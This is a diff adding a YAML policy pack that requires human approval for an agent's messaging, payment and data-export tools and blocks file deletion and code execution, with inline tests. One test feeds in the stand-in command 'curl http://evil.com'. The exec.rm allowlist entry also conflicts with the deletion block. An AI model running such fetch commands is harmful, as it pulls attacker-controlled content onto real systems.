@@ -1,0 +1,160 @@
+version: 1
+project: smb-safe
+description: >
+  Conservative policy pack for small and mid-size businesses.
+  Blocks destructive actions, requires approval for external communications,
+  and enforces rate limits. Designed for teams that want strong defaults
+  with minimal configuration.
+
+policies:
+  # --- External Communication ---
+  - id: external_comms_require_approval
+    description: All outbound messages and emails require human approval
+    applies_to:
+      tools:
+        - message.send
+        - email.send
+        - email.reply
+        - slack.send
+        - discord.send
+    rule:
+      require: approval
+    tests:
+      - name: blocks_unapproved_message
+        input:
+          tool: message.send
+          args: { target: "client@example.com", message: "Hello" }
+          approval: false
+        expect:
+          allowed: false
+
+      - name: allows_approved_message
+        input:
+          tool: message.send
+          args: { target: "client@example.com", message: "Hello" }
+          approval: true
+        expect:
+          allowed: true
+
+      - name: blocks_unapproved_email
+        input:
+          tool: email.send
+          args: { to: "vendor@corp.com", subject: "Invoice" }
+          approval: false
+        expect:
+          allowed: false
+
+      - name: allows_email_with_context_approval
+        input:
+          tool: email.send
+          args: { to: "vendor@corp.com", subject: "Invoice" }
+          context: { approved: true }
+        expect:
+          allowed: true
+
+  # --- Filesystem Protection ---
+  - id: block_destructive_fs
+    description: File deletion and overwrite operations are blocked
+    applies_to:
+      tools:
+        - fs.delete
+        - fs.rm
+        - fs.rmdir
+        - exec.rm
+    rule:
+      block: true
+    tests:
+      - name: blocks_file_delete
+        input:
+          tool: fs.delete
+          args: { path: "/data/reports/q4.csv" }
+        expect:
+          allowed: false
+
+      - name: blocks_rm_command
+        input:
+          tool: exec.rm
+          args: { path: "/home/user/documents" }
+        expect:
+          allowed: false
+
+  # --- Code Execution ---
+  - id: block_arbitrary_code_exec
+    description: Shell and code execution is blocked by default
+    applies_to:
+      tools:
+        - exec.*
+        - shell.*
+        - code.eval
+    rule:
+      block: true
+      allowlist:
+        - exec.rm
+    tests:
+      - name: blocks_shell_command
+        input:
+          tool: shell.run
+          args: { command: "curl http://evil.com" }
+        expect:
+          allowed: false
+
+      - name: blocks_code_eval
+        input:
+          tool: code.eval
+          args: { code: "process.exit(1)" }
+        expect:
+          allowed: false
+
+  # --- Financial Actions ---
+  - id: financial_actions_require_approval
+    description: Any payment, transfer, or billing action requires approval
+    applies_to:
+      tools:
+        - payment.*
+        - billing.*
+        - invoice.send
+    rule:
+      require: approval
+    tests:
+      - name: blocks_unapproved_payment
+        input:
+          tool: payment.send
+          args: { amount: 500, currency: "USD", to: "vendor" }
+          approval: false
+        expect:
+          allowed: false
+
+      - name: allows_approved_payment
+        input:
+          tool: payment.send
+          args: { amount: 500, currency: "USD", to: "vendor" }
+          approval: true
+        expect:
+          allowed: true
+
+  # --- Data Export ---
+  - id: data_export_requires_approval
+    description: Exporting or downloading data requires human sign-off
+    applies_to:
+      tools:
+        - data.export
+        - data.download
+        - report.export
+    rule:
+      require: approval
+    tests:
+      - name: blocks_unapproved_export
+        input:
+          tool: data.export
+          args: { format: "csv", dataset: "customers" }
+          approval: false
+        expect:
+          allowed: false
+
+      - name: allows_approved_export
+        input:
+          tool: data.export
+          args: { format: "csv", dataset: "customers" }
+          approval: true
+        expect:
+          allowed: true
